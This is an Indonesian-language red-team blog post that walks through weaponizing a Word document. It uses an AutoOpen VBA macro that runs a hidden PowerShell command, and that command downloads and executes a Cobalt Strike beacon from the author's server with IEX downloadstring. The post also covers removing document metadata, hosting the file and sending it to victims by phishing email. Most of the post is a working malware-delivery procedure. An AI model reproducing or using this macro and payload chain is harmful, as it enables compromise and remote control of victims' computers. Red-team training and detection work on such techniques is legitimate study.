---
title: '02 - [MS Office - Word] VBA Macro'
date: 2023-07-18 15:44:22 +0700
categories: ['Red Team', 'Malware Development']
tags: [red team, weaponization, malware, ms office, macro, vba]     # TAG names should always be lowercase
author: nairpaa
---


**Visual Basic for Applications (VBA)** adalah implementasi dari Visual Basic yang banyak digunakan dalam aplikasi Microsoft Office. 

VBA Macro ini sering digunakan untuk meningkatkan fungsionalitas dalam Word dan Excel untuk pengolahan data. Namun, keberadaan VBA Macro di dunia komersial dapat menjadi pisau bermata dua ketika disalahgunakan oleh penyerang.

## 0x1 - Creating a Malicious Macro

### Step 1:  Launch Word and Set Up Macro

Untuk membuat macro pada Word, masuk ke menu **View** dan pilih **Macros**. 

Pada bagian nama buat menjadi "`AutoOpen`" agar macro dijalankan secara otomatis saat dokumen dibuka. Selanjutnya, ubah kolom "**Macros in**" dari "`All active templates and documents`" menjadi "`Document 1`".

Jika sudah, klik **Create** dan jendela untuk menuliskan kode VBA akan muncul.

![Membuat Macro pada Word](/assets/img/posts/vba-macro-word/1.png)
_Membuat Macro pada Word_

### Step 2:  VBA Code Execution Test

Tambahkan kode VBA berikut:

```vb
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "notepad"

End Sub
```

Keterangan:
- `wscript`: *Windows Script Host* yang dirancang untuk *automation*.
- `shell`: Method yang memberikan kemampuan untuk mengeksekusi perintah OS.
- `notepad`: Menjalankan aplikasi notepad. 

Untuk menguji kode di atas, gunakan tombol `play`/`pause`/`stop`.

![Uji Coba Macro pada Word](/assets/img/posts/vba-macro-word/2.png)
_Uji Coba Macro pada Word_

### Step 3: Generate Payload

Selanjutnya, kita perlu mengganti `notepad` dengan *payload beacon*. 

Contoh sederhana yang bisa kita gunakan adalah menggunakan *payload PowerShell* yang ada pada Cobalt Strike. 

Pada Cobalt Strike, buka **Attacks > Scripted Web Delivery (S)** dan buat *payload* PowerShell 64-bit untuk HTTP *listener*.  

![Menyiapkan Link Malware pada Cobalt Strike](/assets/img/posts/vba-macro-word/3.png)
_Menyiapkan Link Malware pada Cobalt Strike_

> *URI Path* dapat berupa apa saja, tetapi pada contoh ini saya akan menyimpannya sebagai `/a`.
{: .prompt-info }

Proses tersebut akan menghasilkan *payload* PowerShell dan menghostingnya di Team Server sehingga dapat diunduh melalui HTTP dan dieksekusi dalam memori.  

Setelah mengklik **Launch**, Cobalt Strike akan menghasilkan satu baris PowerShell yang akan melakukan hal tersebut.

![Perintah PowerShell untuk Mengakses Payload Beacon](/assets/img/posts/vba-macro-word/4.png)
_Perintah PowerShell untuk Mengakses Payload Beacon_

### Step 4: Add the Payload in the VBA Code

*Copy/paste* kode PowerShell sebelumnya ke dalam VBA dan pastikan untuk menambahkan satu set tanda kutip ganda di sekitar perintah `IEX`. 

Seharusnya akan terlihat seperti berikut:

```vb
Shell.Run "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://nairpaa.me/a'))"""
```

### Step 5: Save the .doc File

Untuk menyiapkan dokumen sebelum di-*delivery*, buka menu **File > Info > Inspect Document > Inspect Document**, yang akan membuka **Document Inspector**. Klik **Inspect** dan kemudian **Remove All**. 

Hal ini dilakukan untuk mencegah nama pengguna pada sistem Anda dicantumkan dalam dokumen.

![Menghilangkan Informasi Personal Pada Word](/assets/img/posts/vba-macro-word/5.png)
_Menghilangkan Informasi Personal Pada Word_

Selanjutnya, simpan file dengan format `.doc` agar bisa menyimpan macro.

![Menyimpan File .doc](/assets/img/posts/vba-macro-word/6.png)
_Menyimpan File .doc_

### Step 6: Upload the Malware To Team Server

*Upload* file *malware* sebelumnya ke Team Server agar bisa di *download* oleh korban. 

Buka **Manajemen Situs > File Host** dan pilih file dokumen *malware*-nya.

![Mengunggah File .doc Ke Team Server](/assets/img/posts/vba-macro-word/7.png)
_Mengunggah File .doc Ke Team Server_

## 0x2 - Deliver the Malware To the Victim

Ada banyak cara untuk mengirimkan *malware* tersebut ke korban, salah satunya adalah dengan mengirimkannya melalui [email](/posts/office365-phishing-templates/).

Ketika korban membuka file Word tersebut dan mengklik **Enable Content**, maka *payload beacon* akan dijalankan.

![Enable Content](/assets/img/posts/vba-macro-word/8.png)
_Enable Content_

![Koneksi Beacon Berhasil Masuk](/assets/img/posts/vba-macro-word/9.png)
_Koneksi Beacon Berhasil Masuk_









